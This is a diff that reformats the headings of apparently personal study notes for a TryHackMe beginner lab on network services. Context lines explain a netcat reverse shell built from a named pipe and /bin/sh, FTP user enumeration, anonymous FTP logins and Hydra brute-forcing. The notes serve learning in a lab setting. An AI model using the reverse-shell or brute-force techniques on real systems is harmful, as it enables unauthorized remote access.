@@ -1,11 +1,11 @@
 # TryHackMe: Complete Beginner
 
-author:: Nathan Acks  
-date:: 2021-10-02
+**author**:: Nathan Acks  
+**date**:: 2021-10-02
 
-# Network Services
+## Network Services
 
-## Exploiting Telnet
+### Exploiting Telnet
 
 ```bash
 # Listen for ICMP ping packets on an interface:
@@ -39,7 +39,7 @@ What's going on here?
 * We then spin up a netcat instance directed at our local machine (`nc $LOCAL_IP $LOCAL_PORT`), direct the contents of the pipe into netcat's STDIN (`0< /tmp/qdsrgu`), pipe the *output* of netcat to a shell we know probably exists (`| /bin/sh`), and finally redirect *both* STDOUT and STDERR back into the named pipe (`> /tmp/qdsrgu 2>&1`).
 * On the local machine, `nc -lvp $LOCAL_PORT` listens for the incoming netcat connection from the remote. Anything we type on STDIN here gets sent to the remote and piped to /bin/sh *there*. The output of /bin/sh is then sent to the named pipe, which dumps into (the remote) netcat, which then sends the data to the local machine where it ends up on STDOUT.
 
-## Understanding FTP
+### Understanding FTP
 
 The active vs. passive FTP distinction is about how the *server* handles establishing the data channel (the command channel is always set up by the client connecting to the server).
 
@@ -49,7 +49,7 @@ Passive FTP: The server opens a port which the client connects to when establish
 
 * [File Transfer Protocol (Wikipedia)](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
 
-## Enumerating FTP
+### Enumerating FTP
 
 FTP denotes user accounts using a leading tilde; thus `cwd ~admin` will attempt to change the current working directory to the home directory of the `admin` user. Some (older) FTP daemons have a vulnerability where they allow the use of the `cwd` directory before login, and will return an error when attempting to change to a non-existent user directory.
 
@@ -59,7 +59,7 @@ Anonymous FTP logins, if allowed, use the username `anonymous` and a blank passw
 
 * [Solaris 2.6/7.0 - IN.FTPD CWD 'Username' Enumeration](https://www.exploit-db.com/exploits/20745)
 
-## Exploiting FTP
+### Exploiting FTP
 
 Hydra can directly try to brute force passwords on remote machines.
 
